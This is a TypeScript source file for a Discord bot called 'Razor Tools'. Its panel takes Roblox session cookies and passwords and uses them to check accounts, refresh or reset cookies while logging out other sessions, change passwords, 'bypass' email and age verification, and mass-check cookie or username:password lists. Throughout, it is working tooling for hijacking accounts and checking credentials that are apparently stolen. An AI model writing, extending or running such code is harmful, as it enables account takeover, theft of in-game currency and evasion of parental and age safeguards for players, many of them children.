import {
  ActionRowBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type MessageComponentInteraction,
  type ModalSubmitInteraction,
  MessageFlags,
  type ChatInputCommandInteraction,
  SlashCommandBuilder,
  ButtonBuilder,
  ButtonStyle,
} from 'discord.js';
import type { Command } from './types';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import {
  runLoginAction,
  runRefreshAction,
  runResetAction,
  runClearAction,
  runChangePasswordAction,
} from '../../lib/actions';

const modalSessions = new Map<string, { action: string }>();
const noEmailSessions = new Map<string, { cookie: string; password: string }>();

export function buildPanelEmbed() {
  return buildBaseEmbed(
    '✧ 𝐑𝐚𝐳𝐨𝐫 𝐓𝐨𝐨𝐥𝐬 𝐗𝐏 ✧',
    '──── ּ ֶָ֢.\n' +
    '⭑ 𝑷𝒊𝒍𝒊𝒉 𝑭𝒊𝒕𝒖𝒓 𝑫𝒊𝒃𝒂𝒘𝒂𝒉! / 𝑪𝒉𝒐𝒐𝒔𝒆 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑩𝒆𝒍𝒐𝒘!\n' +
    '⭑ 𝑫𝒊𝒃𝒖𝒕𝒖𝒉𝒌𝒂𝒏 𝑫𝒂𝒕𝒂 𝑳𝒐𝒈𝒊𝒏 / 𝑳𝒐𝒈𝒊𝒏 𝑪𝒓𝒆𝒅𝒆𝒏𝒕𝒊𝒂𝒍𝒔 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅.\n' +
    '⭑ 𝑶𝒑𝒕𝒊𝒐𝒏𝒔 𝑹𝒆𝒔𝒖𝒍𝒕 𝑺𝒆𝒏𝒅𝒆𝒅 𝑻𝒐 : 𝑺𝒆𝒓𝒗𝒆𝒓 / 𝑫𝑴\n' +
    '──── ּ ֶָ֢.\n' +
    '✧ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:\n' +
    '• 𝙇𝙤𝙜𝙞𝙣 – 𝘾𝙝𝙚𝙘𝙠 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙛𝙤 \n' +
    '• 𝙍𝙚𝙛𝙧𝙚𝙨𝙝 – 𝙍𝙚𝙛𝙧𝙚𝙨𝙝𝙞𝙣𝙜 𝘾𝙤𝙤𝙠𝙞𝙚 \n' +
    '• 𝙍𝙚𝙨𝙚𝙩 – 𝙇𝙤𝙜𝙤𝙪𝙩 𝙊𝙩𝙝𝙚𝙧𝙨 & 𝙍𝙚𝙘𝙞𝙚𝙫𝙚 𝙉𝙚𝙬 𝘾𝙤𝙤𝙠𝙞𝙚 \n' +
    '• 𝘽𝙮𝙥𝙖𝙨𝙨 – 𝙀𝙢𝙖𝙞𝙡𝙨 𝙍𝙚𝙢𝙤𝙫𝙞𝙣𝙜 \n' +
    '• 𝘾𝙝𝙚𝙘𝙠 – 𝙈𝙖𝙨𝙨 𝘾𝙤𝙤𝙠𝙞𝙚 𝘾𝙝𝙚𝙘𝙠 (𝙪𝙨𝙚 /𝙘𝙝𝙚𝙘𝙠)\n' +
    '• 𝘾𝙝𝙚𝙘𝙠 𝙑2 – 𝙈𝙖𝙨𝙨 𝘾𝙧𝙚𝙙𝙚𝙣𝙩𝙞𝙖𝙡 𝘾𝙝𝙚𝙘𝙠 (𝙪𝙨𝙚 /𝙘𝙝𝙚𝙘𝙠𝙫2)\n' +
    '• 𝘾𝙡𝙚𝙖𝙧 – 𝘾𝙡𝙚𝙖𝙧 𝘾𝙤𝙤𝙠𝙞𝙚𝙨 \n' +
    '• 𝘾𝙋 – 𝘾𝙝𝙖𝙣𝙜𝙚𝙨 𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 \n' +
    '────────────────────────────',
    'Razor Tools On Top!'
  );
}

export function buildPanelSelect() {
  const select = new StringSelectMenuBuilder()
    .setCustomId('panel_select')
    .setPlaceholder('Choose an action')
    .addOptions(
      new StringSelectMenuOptionBuilder()
        .setLabel('🔐 Login / Check')
        .setValue('login')
        .setDescription('Measuring Account Infos'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Refresh Cookie')
        .setValue('refresh')
        .setDescription('Refresh Cookie'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Reset Cookie')
        .setValue('reset')
        .setDescription('Reset Current Cookie'),
      new StringSelectMenuOptionBuilder()
        .setLabel('⚡ Bypass')
        .setValue('bypass')
        .setDescription('Attempt Gmail Bypassing (With API)'),
      new StringSelectMenuOptionBuilder()
        .setLabel('📂 Mass Check (Cookies)')
        .setValue('check')
        .setDescription('W.I.P'),
      new StringSelectMenuOptionBuilder()
        .setLabel('📂 Mass Check V2 (USN:PW)')
        .setValue('checkv2')
        .setDescription('W.I.P'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🧹 Clear Cookie')
        .setValue('clear')
        .setDescription('Clear Cookie Format'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔑 CP')
        .setValue('cp')
        .setDescription('Change Password Directly')
    );
  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
}

const data = new SlashCommandBuilder()
  .setName('panel')
  .setDescription('Open the Razor Tools control panel in this channel')
  .setDefaultMemberPermissions('0') as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildPanelEmbed()],
    components: [buildPanelSelect()],
  });
}

async function handleSelect(interaction: MessageComponentInteraction): Promise<void> {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'panel_select') return;

  const action = interaction.values[0];
  const userId = interaction.user.id;

  if (action === 'check' || action === 'checkv2') {
    const commandName = action === 'check' ? '/check' : '/checkv2';
    await interaction.reply({
      content: `📂 Please use the \`${commandName}\` command directly to upload a file.\nThis action is not available in the panel.`,
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  const modal = new ModalBuilder()
    .setCustomId(`panel_modal_${action}_${userId}`)
    .setTitle(`Razor Tools – ${action.charAt(0).toUpperCase() + action.slice(1)}`);

  let fields: TextInputBuilder[] = [];

  if (action === 'clear') {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
  } else if (action === 'bypass' || action === 'cp') {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
    const passInput = new TextInputBuilder()
      .setCustomId('password')
      .setLabel('Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(passInput);
    if (action === 'cp') {
      const newPassInput = new TextInputBuilder()
        .setCustomId('new_password')
        .setLabel('New Password')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setPlaceholder('Enter new password');
      fields.push(newPassInput);
    }
  } else {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
  }

  const deliveryInput = new TextInputBuilder()
    .setCustomId('delivery')
    .setLabel('Send To S/D? (S - SERVER | D - DM)')
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setValue('S')
    .setPlaceholder('S or D');
  fields.push(deliveryInput);

  const rows = fields.map(f => new ActionRowBuilder<TextInputBuilder>().addComponents(f));
  modal.addComponents(...rows);

  modalSessions.set(`${action}_${userId}`, { action });

  await interaction.showModal(modal);

  const freshSelect = buildPanelSelect();
  await interaction.message.edit({ components: [freshSelect] }).catch(() => {});
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const userId = interaction.user.id;
  const parts = interaction.customId.split('_');
  const action = parts[2];
  const sessionKey = `${action}_${userId}`;
  const session = modalSessions.get(sessionKey);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please open the panel again.', flags: MessageFlags.Ephemeral });
    return;
  }

  let cookie = '';
  let password = '';
  let newPassword = '';

  try {
    cookie = interaction.fields.getTextInputValue('cookie') || '';
  } catch {}
  try {
    password = interaction.fields.getTextInputValue('password') || '';
  } catch {}
  try {
    newPassword = interaction.fields.getTextInputValue('new_password') || '';
  } catch {}

  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toUpperCase().trim();
  const delivery = (deliveryRaw === 'D') ? 'dm' : 'server';

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  async function sendResult(content: any) {
    if (delivery === 'dm') {
      try {
        await interaction.user.send(content);
        await interaction.editReply({ content: '✅ Result sent to your DMs.' });
      } catch {
        await interaction.editReply(content);
      }
    } else {
      await interaction.editReply(content);
    }
  }

  try {
    let result;
    switch (action) {
      case 'login':
        result = await runLoginAction(cookie);
        break;
      case 'refresh':
        result = await runRefreshAction(cookie);
        if (result.success && result.newCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'refresh', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      case 'reset':
        result = await runResetAction(cookie);
        if (result.success && result.newCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'reset', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      case 'bypass': {
        const validation = await Roblox.validateCookie(cookie);
        if (!validation.valid) {
          const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
          await sendResult({ embeds: [embed] });
          modalSessions.delete(sessionKey);
          return;
        }

        const pwValid = await Roblox.validatePassword(validation.username!, password);
        if (!pwValid.valid) {
          const embed = buildErrorEmbed(
            `✧ **Invalid Password**\n────\n` +
            `⭑ The provided password is incorrect for this account.\n` +
            `⭑ Please try again.`
          );
          await sendResult({ embeds: [embed] });
          modalSessions.delete(sessionKey);
          return;
        }

        const email = await Roblox.fetchEmailInfo(cookie);
        if (!email.verified) {
          const embed = buildBaseEmbed(
            '𖣐 No Email Detected',
            `✧ **Account:** ${validation.username}\n` +
            `────\n` +
            `⭑ No verified email found on this account.\n` +
            `⭑ You can reauthenticate (reset cookie) or change the password.\n` +
            `⭑ Your credentials were not logged.`
          );
          const sessionId = Math.random().toString(36).slice(2, 10);
          noEmailSessions.set(sessionId, { cookie, password });
          setTimeout(() => noEmailSessions.delete(sessionId), 600000);
          const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder()
              .setCustomId(`bypass_reauth_${sessionId}`)
              .setLabel('🔄 Reauth')
              .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
              .setCustomId(`bypass_resetpw_${sessionId}`)
              .setLabel('🔑 Reset Password')
              .setStyle(ButtonStyle.Secondary)
          );
          await sendResult({ embeds: [embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }

        const progressEmbed = buildProgressEmbed('Sending bypass request...');
        await sendResult({ embeds: [progressEmbed] });

        let lastMessage = 'Sending bypass request...';
        let timedOut = false;
        const result = await (async () => {
          let delay = 3000;
          const startTime = Date.now();
          const maxDuration = 60000;
          for (let attempt = 1; attempt <= 6; attempt++) {
            if (Date.now() - startTime > maxDuration) {
              timedOut = true;
              return { success: false, message: 'Timeout', timedOut: true };
            }
            const res = await Roblox.bypassAgeVerification(cookie, password);
            if (res.success) return res;
            if (res.inProgress) {
              lastMessage = `Processing... (attempt ${attempt}/6)`;
              const updateEmbed = buildProgressEmbed(lastMessage);
              await sendResult({ embeds: [updateEmbed] });
              if (attempt < 6) {
                await new Promise(resolve => setTimeout(resolve, delay));
                delay = Math.min(delay * 1.5, 10000);
              }
              continue;
            }
            return res;
          }
          return { success: false, message: 'Still processing, please check later.', timedOut: true };
        })();

        if (timedOut) {
          const embed = buildProgressEmbed('Bypass timed out after 60 seconds. Please try again later.');
          await sendResult({ embeds: [embed] });
          modalSessions.delete(sessionKey);
          return;
        }

        if (result.success) {
          const userId = validation.userId!;
          const age = await Roblox.getUserAge(userId);
          const robux = await Roblox.fetchRobux(cookie, String(userId));
          const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
          const country = await Roblox.fetchCountry(cookie);
          const parental = await Roblox.fetchParentalControls(cookie);
          const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

          let newCookie = result.newCookie;
          let finalUserId = userId;
          let finalUsername = validation.username!;
          let finalDisplayName = validation.displayName || null;
          let finalAge = age;
          let finalRobux = robux;
          let finalSummary = summary;
          let finalCountry = country;
          let finalEmail = email;
          let finalParental = parental;
          let finalThumb = thumb;

          if (newCookie) {
            const newValidation = await Roblox.validateCookie(newCookie);
            if (newValidation.valid) {
              finalUserId = newValidation.userId!;
              finalUsername = newValidation.username!;
              finalDisplayName = newValidation.displayName || null;
              finalAge = await Roblox.getUserAge(finalUserId);
              finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
              finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
              finalCountry = await Roblox.fetchCountry(newCookie);
              finalEmail = await Roblox.fetchEmailInfo(newCookie);
              finalParental = await Roblox.fetchParentalControls(newCookie);
              finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
            } else {
              newCookie = undefined;
            }
          }

          const embed = buildAccountEmbed(
            finalUsername,
            finalDisplayName,
            finalUserId,
            finalAge,
            finalRobux,
            finalSummary,
            finalCountry,
            finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
            finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
            finalThumb
          );

          const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
          const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, delivery === 'dm') : undefined;
          await sendResult({ embeds: [embed], components: row ? [row] : [] });
          modalSessions.delete(sessionKey);
          return;
        }

        if (result.timedOut) {
          const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
          await sendResult({ embeds: [embed] });
          modalSessions.delete(sessionKey);
          return;
        }

        await sendResult({
          embeds: [
            buildErrorEmbed(
              `✧ **Bypass Failed**\n────\n⭑ ${result.message}\n⭑ Your credentials were not logged.`
            ),
          ],
        });
        modalSessions.delete(sessionKey);
        break;
      }
      case 'clear':
        result = await runClearAction(cookie);
        if (result.success && result.cleanedCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'clear', result.cleanedCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      case 'cp':
        result = await runChangePasswordAction(cookie, password, newPassword);
        break;
      default:
        await sendResult({ embeds: [buildErrorEmbed('✧ **Unknown Action**\n────\n⭑ Something went wrong.')] });
        modalSessions.delete(sessionKey);
        return;
    }
    await sendResult({ embeds: [result.embed] });
  } catch (err: any) {
    logger.error({ err }, 'Panel modal error');
    await sendResult({ embeds: [buildErrorEmbed('✧ **Error**\n────\n⭑ An unexpected error occurred.')] });
  }

  modalSessions.delete(sessionKey);
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  const customId = interaction.customId;
  if (customId.startsWith('panel_')) {
    return;
  }
  if (customId.startsWith('bypass_reauth_') || customId.startsWith('bypass_resetpw_')) {
    const parts = customId.split('_');
    const action = parts[1];
    const id = parts[2];
    const session = noEmailSessions.get(id);
    if (!session) {
      await interaction.reply({ content: 'Session expired. Please run /bypass again.', flags: MessageFlags.Ephemeral });
      return;
    }
    if (action === 'reauth') {
      const result = await runResetAction(session.cookie);
      if (result.success && result.newCookie) {
        const newId = Math.random().toString(36).slice(2, 10);
        const row = buildCopyButtons(newId, 'reset', result.newCookie, false);
        await interaction.reply({ embeds: [result.embed], components: [row], flags: MessageFlags.Ephemeral });
      } else {
        await interaction.reply({ embeds: [result.embed], flags: MessageFlags.Ephemeral });
      }
      noEmailSessions.delete(id);
      return;
    }
    if (action === 'resetpw') {
      const modal = new ModalBuilder()
        .setCustomId(`bypass_resetpw_modal_${id}`)
        .setTitle('Reset Password');
      const input = new TextInputBuilder()
        .setCustomId('new_password')
        .setLabel('New Password')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setPlaceholder('Enter your new password');
      modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
      await interaction.showModal(modal);
      return;
    }
  }
  if (customId.startsWith('reset_')) {
    await resetCommand.handleButton?.(interaction);
    return;
  }
  if (customId.startsWith('clear_')) {
    await clearCommand.handleButton?.(interaction);
    return;
  }
  if (customId.startsWith('bypass_')) {
    await bypassCommand.handleButton?.(interaction);
    return;
  }
  if (customId.startsWith('check_')) {
    await checkCommand.handleButton?.(interaction);
    return;
  }
  if (customId.startsWith('refresh_')) {
    await refreshCommand.handleButton?.(interaction);
    return;
  }
  await interaction.reply({ content: 'Unknown button.', flags: MessageFlags.Ephemeral });
}

export const panelCommand: Command = { data, execute, handleSelect, handleButton, handleModal };